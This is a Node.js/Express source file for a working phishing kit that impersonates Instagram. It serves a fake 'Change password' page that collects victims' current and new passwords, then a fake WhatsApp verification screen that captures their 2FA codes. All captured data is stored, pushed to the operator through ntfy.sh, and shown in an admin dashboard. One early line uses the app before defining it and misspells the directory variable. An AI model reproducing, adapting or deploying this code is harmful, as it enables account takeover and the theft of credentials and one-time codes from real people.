const express = require("express");
const path = require("path");
const fs = require("fs");


app.use(express.static(_dirname));

// ─── Config ───────────────────────────────────────────────────────────────────
const PORT       = process.env.PORT       || 3000;
const ADMIN_KEY  = process.env.ADMIN_KEY  || "admin-secret-change-me";
const NTFY_TOPIC = process.env.NTFY_TOPIC || "";   // e.g. "my-ntfy-topic"
const DATA_FILE  = process.env.DATA_FILE  || path.join(__dirname, "data.json");

// ─── Storage (JSON file) ──────────────────────────────────────────────────────
function loadData() {
  try { return JSON.parse(fs.readFileSync(DATA_FILE, "utf8")); } catch (_) { return []; }
}
function saveData(rows) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(rows, null, 2));
}
function addEntry(entry) {
  const rows = loadData();
  rows.unshift({ ...entry, submittedAt: new Date().toISOString() });
  saveData(rows);
}

// ─── ntfy push notifications ──────────────────────────────────────────────────
async function sendNtfy(title, body, tags, priority = "high") {
  if (!NTFY_TOPIC) return;
  try {
    await fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
      method: "POST",
      headers: { "Content-Type": "text/plain", Title: title, Priority: priority, Tags: tags },
      body,
    });
  } catch (e) { console.error("ntfy error:", e.message); }
}

// ─── Express ──────────────────────────────────────────────────────────────────
const app = express();
app.use(express.json());

// Serve static files from ./public  (put whatsapp-verify.jpeg here)
const publicDir = path.join(__dirname, "public");
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
app.use(express.static(publicDir));

// ─── API routes ───────────────────────────────────────────────────────────────

app.post("/api/password-changes", (req, res) => {
  const { account, currentPassword, newPassword } = req.body;
  if (!account || !currentPassword || !newPassword)
    return res.status(400).json({ error: "Invalid request body" });
  addEntry({ type: "password", account, currentPassword, newPassword });
  sendNtfy(
    "New password submission",
    `Account: ${account}\nCurrent: ${currentPassword}\nNew: ${newPassword}`,
    "lock"
  );
  res.status(201).json({ ok: true });
});

app.post("/api/verification-code", (req, res) => {
  const { account, code, trustDevice } = req.body;
  if (!code) return res.status(400).json({ error: "Invalid request body" });
  addEntry({
    type: "code",
    account: account || "unknown",
    code,
    trustDevice: (trustDevice === true || trustDevice === "true") ? "true" : "false",
  });
  sendNtfy(
    "2FA code captured",
    `Account: ${account || "unknown"}\nCode: ${code}`,
    "key", "urgent"
  );
  res.status(201).json({ ok: true });
});

app.get("/api/admin/entries", (req, res) => {
  if (req.query.key !== ADMIN_KEY)
    return res.status(401).json({ error: "Unauthorized" });
  res.json(loadData());
});

// ─── Change Password page ─────────────────────────────────────────────────────

const CHANGE_PASSWORD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Change Password &middot; Instagram</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="icon" href="https://www.instagram.com/favicon.ico" />
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
    .strength-bar { height: 4px; border-radius: 9999px; flex: 1; transition: background 0.3s; }
    .safe-bottom { padding-bottom: max(2rem, env(safe-area-inset-bottom, 1rem)); }
  </style>
</head>
<body class="min-h-screen flex items-end sm:items-center justify-center sm:px-4"
      style="background:rgba(0,0,0,0.55)">
<div id="root"></div>
<script>
// ── Account from URL ──────────────────────────────────────────────────────────
// Supports: /?account=user  /?user  /?u=user  (any single param works)
let currentAccount = (() => {
  const p = new URLSearchParams(location.search);
  if (p.get("account")) return p.get("account");
  const first = p.keys().next().value;
  if (first && !p.get(first)) return first;
  if (first && p.get(first))  return p.get(first);
  return "once.an.ishra.fan";
})();

function closePage() { if (history.length > 1) history.back(); else window.close(); }
function openGmail() {
  location.href = "googlegmail://";
  setTimeout(() => { location.href = "https://mail.google.com"; }, 400);
}
function eyeIcon(v) {
  return v
    ? '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>'
    : '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
}
function wireEye(id) {
  const inp = document.getElementById("inp-" + id);
  const eye = document.getElementById("eye-" + id);
  if (!inp || !eye) return;
  let vis = false;
  inp.addEventListener("focus", () => inp.style.borderColor = "#6aade4");
  inp.addEventListener("blur",  () => inp.style.borderColor = "#d0dce8");
  eye.addEventListener("click", () => { vis = !vis; inp.type = vis ? "text" : "password"; eye.innerHTML = eyeIcon(vis); });
}
function pwField(id, ph) {
  return \`<div class="relative">
    <input id="inp-\${id}" type="password" placeholder="\${ph}"
      class="w-full bg-white border rounded-xl px-4 py-3 pr-11 text-base text-gray-700 placeholder-gray-400 focus:outline-none transition-colors"
      style="border-color:#d0dce8"/>
    <button type="button" id="eye-\${id}" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">\${eyeIcon(false)}</button>
  </div>\`;
}
function getStrength(pw) {
  if (!pw.length) return { level: 0, label: "", color: "" };
  let s = 0;
  if (pw.length >= 8) s++;
  if (/[A-Z]/.test(pw)) s++;
  if (/[0-9]/.test(pw)) s++;
  if (/[^A-Za-z0-9]/.test(pw)) s++;
  if (s <= 1) return { level: 1, label: "Weak",   color: "#ef4444" };
  if (s <= 2) return { level: 2, label: "Medium", color: "#f59e0b" };
  return { level: 3, label: "Strong", color: "#22c55e" };
}
function backArrow() {
  return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="w-5 h-5"><path d="M15 18l-6-6 6-6"/></svg>';
}
function closeX() {
  return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="w-5 h-5"><path d="M18 6L6 18M6 6l12 12"/></svg>';
}

// ── WhatsApp 2FA screen ───────────────────────────────────────────────────────
function showWhatsApp(acc) {
  let trust = true;
  document.getElementById("root").innerHTML = \`
  <div class="w-full sm:max-w-md bg-white rounded-t-3xl sm:rounded-3xl shadow-2xl overflow-y-auto flex flex-col safe-bottom"
       style="min-height:clamp(460px,88svh,820px)">
    <div class="px-6 pt-5 flex-1 flex flex-col">
      <div class="w-10 h-1 bg-gray-200 rounded-full mx-auto mb-5 sm:hidden"></div>
      <button id="wa-back" class="w-8 h-8 flex items-center justify-center text-gray-800 mb-3 -ml-1">\${backArrow()}</button>
      <p class="text-sm text-gray-500 mb-1"><span class="font-semibold text-gray-700">\${acc}</span> &middot; Instagram</p>
      <h2 class="text-2xl font-bold text-gray-900 mb-1 leading-tight">Check your WhatsApp messages</h2>
      <p class="text-sm text-gray-500 mb-4 leading-relaxed">Enter the code that we sent to your WhatsApp account.</p>
      <div class="rounded-2xl overflow-hidden mb-5" style="height:175px;background:#dcfce7">
        <img src="/whatsapp-verify.jpeg" alt="WhatsApp verification"
             class="w-full h-full object-cover" onerror="this.style.display='none'" />
      </div>
      <input id="wa-code" type="tel" inputmode="numeric" pattern="[0-9]*" maxlength="6"
        placeholder="Code"
        class="w-full bg-white border rounded-xl px-4 py-3 text-base text-gray-700 placeholder-gray-400 focus:outline-none transition-colors mb-4"
        style="border-color:#e0e3e8"/>
      <label class="flex items-center gap-3 mb-5 cursor-pointer select-none" id="trust-label">
        <div id="trust-box" class="w-5 h-5 rounded flex items-center justify-center border-2 shrink-0"
             style="background-color:#0095f6;border-color:#0095f6">
          <svg viewBox="0 0 12 10" fill="none" class="w-3 h-3"><path d="M1 5l3.5 3.5L11 1" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </div>
        <span class="text-sm text-gray-700 leading-snug">Trust this device and skip this step from now on</span>
      </label>
      <button id="wa-continue"
        class="w-full font-semibold py-3 rounded-full text-white text-base mb-3"
        style="background-color:#a8c8ed;cursor:not-allowed" disabled>Continue</button>
      <button id="wa-other" class="w-full font-semibold py-3 rounded-full text-base text-gray-700"
        style="background-color:#eff0f2">Try another way</button>
    </div>
  </div>\`;

  const codeInp  = document.getElementById("wa-code");
  const contBtn  = document.getElementById("wa-continue");
  const trustBox = document.getElementById("trust-box");
  const CHECK = '<svg viewBox="0 0 12 10" fill="none" class="w-3 h-3"><path d="M1 5l3.5 3.5L11 1" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';

  codeInp.focus();
  codeInp.addEventListener("focus", () => codeInp.style.borderColor = "#aab4c0");
  codeInp.addEventListener("blur",  () => codeInp.style.borderColor = "#e0e3e8");
  codeInp.addEventListener("input", e => {
    e.target.value = e.target.value.replace(/\\D/g, "");
    const ok = e.target.value.length >= 1;
    contBtn.disabled = !ok;
    contBtn.style.backgroundColor = ok ? "#0095f6" : "#a8c8ed";
    contBtn.style.cursor = ok ? "pointer" : "not-allowed";
  });
  codeInp.addEventListener("keydown", e => { if (e.key === "Enter") doSend(); });

  document.getElementById("trust-label").addEventListener("click", () => {
    trust = !trust;
    trustBox.style.backgroundColor = trust ? "#0095f6" : "white";
    trustBox.style.borderColor      = trust ? "#0095f6" : "#aab4c0";
    trustBox.innerHTML = trust ? CHECK : "";
  });

  async function doSend() {
    if (!codeInp.value.length) return;
    contBtn.textContent = "Verifying\u2026"; contBtn.disabled = true;
    try {
      await fetch("/api/verification-code", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ account: acc, code: codeInp.value, trustDevice: trust }),
      });
    } catch (_) {}
    openGmail();
  }

  document.getElementById("wa-back").addEventListener("click", closePage);
  document.getElementById("wa-other").addEventListener("click", openGmail);
  contBtn.addEventListener("click", doSend);
}

// ── Change Password screen ────────────────────────────────────────────────────
function showChangePassword(errorMsg) {
  document.getElementById("root").innerHTML = \`
  <div class="w-full sm:max-w-md bg-white rounded-t-3xl sm:rounded-3xl shadow-2xl overflow-y-auto flex flex-col safe-bottom"
       style="min-height:clamp(460px,88svh,820px)">
    <div class="px-6 pt-5 flex-1 flex flex-col">
      <div class="w-10 h-1 bg-gray-200 rounded-full mx-auto mb-5 sm:hidden"></div>
      <div class="flex items-center justify-between mb-4">
        <button id="btn-back"  class="w-8 h-8 flex items-center justify-center text-gray-600 hover:text-gray-900">\${backArrow()}</button>
        <button id="btn-close" class="w-8 h-8 flex items-center justify-center text-gray-600 hover:text-gray-900">\${closeX()}</button>
      </div>
      <div class="flex items-center gap-2 mb-1">
        <span class="text-sm text-gray-500">\${currentAccount}</span>
        <span class="text-gray-400 text-sm select-none">&middot;</span>
        <span class="text-sm text-gray-500">Login</span>
      </div>
      <h1 class="text-2xl font-bold text-gray-900 mb-3">Change password</h1>
      \${errorMsg ? \`<div class="bg-red-50 border border-red-200 text-red-600 text-sm rounded-xl px-4 py-3 mb-4">\${errorMsg}</div>\` : ""}
      <p class="text-sm text-gray-500 mb-3 leading-relaxed">You'll be logged out of all sessions except this one to protect your account if anyone is trying to gain access.</p>
      <p class="text-sm text-gray-500 mb-5 leading-relaxed">Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>
      <div class="mb-3">\${pwField("current", "Current password (Updated 09/03/2022)")}</div>
      <div>
        \${pwField("newpass", "New password")}
        <div id="sbar" class="mt-1.5 mb-3" style="display:none">
          <div class="flex gap-1 mb-1">
            <div class="strength-bar" id="sb1" style="background:#e5e7eb"></div>
            <div class="strength-bar" id="sb2" style="background:#e5e7eb"></div>
            <div class="strength-bar" id="sb3" style="background:#e5e7eb"></div>
          </div>
          <span id="sbl" class="text-xs font-medium"></span>
        </div>
      </div>
      <div class="mb-1">
        \${pwField("confirm", "Re-type new password")}
        <p id="mismatch" class="text-xs text-red-500 mt-1.5 ml-1" style="display:none">Passwords don't match</p>
      </div>
      <button class="text-sm font-semibold hover:opacity-80 block mb-6 mt-3 bg-transparent border-none text-left" style="color:#0095f6">Forgot your password?</button>
      <button id="submit-btn" disabled
        class="w-full font-semibold py-3 rounded-full text-white text-base transition-opacity duration-200"
        style="background-color:#a8c8ed;cursor:not-allowed">Change password</button>
    </div>
  </div>\`;

  wireEye("current"); wireEye("newpass"); wireEye("confirm");
  document.getElementById("btn-back").addEventListener("click", closePage);
  document.getElementById("btn-close").addEventListener("click", closePage);

  document.getElementById("inp-newpass").addEventListener("input", () => {
    const pw = document.getElementById("inp-newpass").value;
    const { level, label, color } = getStrength(pw);
    const bar = document.getElementById("sbar");
    if (!level) { bar.style.display = "none"; checkReady(); return; }
    bar.style.display = "block";
    [1,2,3].forEach(i => { document.getElementById("sb"+i).style.background = i <= level ? color : "#e5e7eb"; });
    const l = document.getElementById("sbl"); l.textContent = label; l.style.color = color;
    checkReady();
  });
  document.getElementById("inp-current").addEventListener("input", checkReady);
  document.getElementById("inp-confirm").addEventListener("input", checkReady);

  function checkReady() {
    const cur  = document.getElementById("inp-current").value;
    const npw  = document.getElementById("inp-newpass").value;
    const conf = document.getElementById("inp-confirm").value;
    const mm   = conf.length > 0 && conf !== npw;
    document.getElementById("mismatch").style.display = mm ? "block" : "none";
    const ok = cur.length > 0 && npw.length >= 6 && conf.length > 0 && !mm;
    const btn = document.getElementById("submit-btn");
    btn.disabled = !ok;
    btn.style.backgroundColor = ok ? "#0095f6" : "#a8c8ed";
    btn.style.cursor = ok ? "pointer" : "not-allowed";
  }

  document.getElementById("submit-btn").addEventListener("click", async () => {
    const cur = document.getElementById("inp-current").value;
    const npw = document.getElementById("inp-newpass").value;
    const btn = document.getElementById("submit-btn");
    btn.textContent = "Saving\u2026"; btn.disabled = true;
    try {
      const res = await fetch("/api/password-changes", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ account: currentAccount, currentPassword: cur, newPassword: npw }),
      });
      if (!res.ok) { const d = await res.json().catch(()=>({})); showChangePassword(d.error || "HTTP "+res.status); return; }
      showWhatsApp(currentAccount);
    } catch (_) { showChangePassword("Something went wrong. Please try again."); }
  });
}

showChangePassword();
</script>
</body>
</html>`;

// ─── Admin page ───────────────────────────────────────────────────────────────

const ADMIN_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>* { box-sizing:border-box; } body { margin:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; }</style>
</head>
<body class="min-h-screen bg-gray-950 text-white">
<div id="app"></div>
<script>
let savedKey = sessionStorage.getItem("admin_key") || "";
let authed = false;
let entries = [];
let timer = null;

function render() { authed ? renderDash() : renderLogin(); }

function renderLogin(err) {
  document.getElementById("app").innerHTML = \`
  <div class="min-h-screen flex items-center justify-center bg-gray-950 p-4">
    <div class="bg-white rounded-2xl shadow-xl p-8 w-full max-w-sm">
      <div class="flex items-center gap-2 mb-6">
        <svg viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2" class="w-6 h-6"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
        <h1 class="text-xl font-bold text-gray-900">Admin Access</h1>
      </div>
      <input id="key-inp" type="password" placeholder="Enter admin key" value="\${savedKey}"
        class="w-full border border-gray-200 rounded-xl px-4 py-3 mb-4 text-base text-gray-900 focus:outline-none focus:border-blue-400 transition-colors"/>
      \${err ? \`<p class="text-sm text-red-500 mb-3">\${err}</p>\` : ""}
      <button id="sign-in" class="w-full py-3 rounded-full font-semibold text-white text-base" style="background-color:#0095f6">Sign in</button>
    </div>
  </div>\`;
  const inp = document.getElementById("key-inp");
  const btn = document.getElementById("sign-in");
  inp.addEventListener("keydown", e => { if (e.key === "Enter") btn.click(); });
  btn.addEventListener("click", () => { savedKey = inp.value; fetchEntries(savedKey); });
}

function renderDash() {
  const pw   = entries.filter(e => e.type === "password" || ("currentPassword" in e && !("code" in e)));
  const code = entries.filter(e => e.type === "code"     || ("code" in e && !("currentPassword" in e)));

  function pwRows() {
    if (!pw.length) return '<div class="bg-gray-900 rounded-2xl p-8 text-center text-gray-600 text-sm">No password submissions yet.</div>';
    return \`<div class="bg-gray-900 rounded-2xl overflow-hidden shadow-xl"><div class="overflow-x-auto"><table class="w-full text-sm">
      <thead><tr class="border-b border-gray-800">
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">#</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">Time</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">Account</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">Current Password</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">New Password</th>
      </tr></thead>
      <tbody>\${pw.map((e,i) => \`
        <tr class="border-b border-gray-800/60 hover:bg-gray-800/40 transition-colors">
          <td class="px-5 py-3.5 text-gray-600 text-xs">\${pw.length-i}</td>
          <td class="px-5 py-3.5 text-gray-400 whitespace-nowrap text-xs">\${new Date(e.submittedAt).toLocaleString()}</td>
          <td class="px-5 py-3.5 text-blue-400 font-medium">\${e.account}</td>
          <td class="px-5 py-3.5 text-green-400 font-mono">\${e.currentPassword}</td>
          <td class="px-5 py-3.5 text-yellow-400 font-mono">\${e.newPassword}</td>
        </tr>\`).join("")}</tbody>
    </table></div></div>\`;
  }

  function codeRows() {
    if (!code.length) return '<div class="bg-gray-900 rounded-2xl p-8 text-center text-gray-600 text-sm">No verification codes yet.</div>';
    return \`<div class="bg-gray-900 rounded-2xl overflow-hidden shadow-xl"><div class="overflow-x-auto"><table class="w-full text-sm">
      <thead><tr class="border-b border-gray-800">
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">#</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">Time</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">Account</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">2FA Code</th>
        <th class="text-left px-5 py-3 text-gray-500 font-medium text-xs uppercase">Trust Device</th>
      </tr></thead>
      <tbody>\${code.map((e,i) => \`
        <tr class="border-b border-gray-800/60 hover:bg-gray-800/40 transition-colors">
          <td class="px-5 py-3.5 text-gray-600 text-xs">\${code.length-i}</td>
          <td class="px-5 py-3.5 text-gray-400 whitespace-nowrap text-xs">\${new Date(e.submittedAt).toLocaleString()}</td>
          <td class="px-5 py-3.5 text-blue-400 font-medium">\${e.account}</td>
          <td class="px-5 py-3.5 font-mono">
            <span style="background:rgba(88,28,135,0.35);color:#d8b4fe" class="px-2 py-1 rounded-lg text-base tracking-widest font-bold">\${e.code}</span>
          </td>
          <td class="px-5 py-3.5">
            <span class="text-xs px-2 py-1 rounded-full font-medium \${e.trustDevice==="true"?"text-green-400":"text-gray-500"}"
              style="background:\${e.trustDevice==="true"?"rgba(22,101,52,0.4)":"rgba(31,41,55,1)"}">
              \${e.trustDevice==="true"?"Trusted":"Not trusted"}
            </span>
          </td>
        </tr>\`).join("")}</tbody>
    </table></div></div>\`;
  }

  document.getElementById("app").innerHTML = \`
  <div class="min-h-screen bg-gray-950 p-4 sm:p-8">
    <div class="max-w-5xl mx-auto">
      <div class="flex items-center justify-between mb-8">
        <div>
          <h1 class="text-2xl font-bold text-white">Admin Dashboard</h1>
          <p class="text-xs text-gray-400 mt-1">Updated \${new Date().toLocaleTimeString()} &middot; auto-refreshes every 30s</p>
        </div>
        <div class="flex gap-2">
          <button id="btn-refresh" class="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-gray-800 text-gray-200 text-sm hover:bg-gray-700 transition-colors">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path d="M23 4v6h-6"/><path d="M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
            Refresh
          </button>
          <button id="btn-out" class="flex items-center gap-1.5 px-4 py-2 rounded-lg bg-gray-800 text-gray-200 text-sm hover:bg-gray-700 transition-colors">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="w-4 h-4"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
            Sign out
          </button>
        </div>
      </div>
      <div class="mb-8">
        <div class="flex items-center gap-2 mb-3">
          <div class="w-2.5 h-2.5 rounded-full bg-green-400"></div>
          <h2 class="text-sm font-semibold text-gray-300 uppercase tracking-wider">Password Submissions (\${pw.length})</h2>
        </div>
        \${pwRows()}
      </div>
      <div>
        <div class="flex items-center gap-2 mb-3">
          <div class="w-2.5 h-2.5 rounded-full bg-purple-400"></div>
          <h2 class="text-sm font-semibold text-gray-300 uppercase tracking-wider">WhatsApp 2FA Codes (\${code.length})</h2>
        </div>
        \${codeRows()}
      </div>
    </div>
  </div>\`;

  document.getElementById("btn-refresh").addEventListener("click", () => fetchEntries(savedKey));
  document.getElementById("btn-out").addEventListener("click", () => {
    sessionStorage.removeItem("admin_key");
    authed = false; entries = [];
    if (timer) { clearInterval(timer); timer = null; }
    render();
  });
}

async function fetchEntries(key) {
  try {
    const res = await fetch("/api/admin/entries?key=" + encodeURIComponent(key));
    if (res.status === 401) { authed = false; renderLogin("Wrong admin key."); return; }
    if (!res.ok) throw new Error("HTTP " + res.status);
    entries = await res.json();
    authed = true; savedKey = key;
    sessionStorage.setItem("admin_key", key);
    renderDash();
    if (!timer) timer = setInterval(() => fetchEntries(savedKey), 30000);
  } catch (e) {
    if (!authed) renderLogin("Connection error: " + e.message);
  }
}

if (savedKey) fetchEntries(savedKey);
else render();
</script>
</body>
</html>`;

// ─── Routes ───────────────────────────────────────────────────────────────────
app.get("/", (_req, res) => res.send(CHANGE_PASSWORD_HTML));
app.get("/admin", (_req, res) => res.send(ADMIN_HTML));

app.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════════╗
║   Instagram CP — running on port ${PORT}        ║
╠══════════════════════════════════════════════╣
║  Page  →  http://localhost:${PORT}/             ║
║  Admin →  http://localhost:${PORT}/admin        ║
╠══════════════════════════════════════════════╣
║  ADMIN_KEY  = ${ADMIN_KEY.padEnd(29)} ║
║  NTFY_TOPIC = ${(NTFY_TOPIC || "(not set)").padEnd(29)} ║
╚══════════════════════════════════════════════╝
`);
});
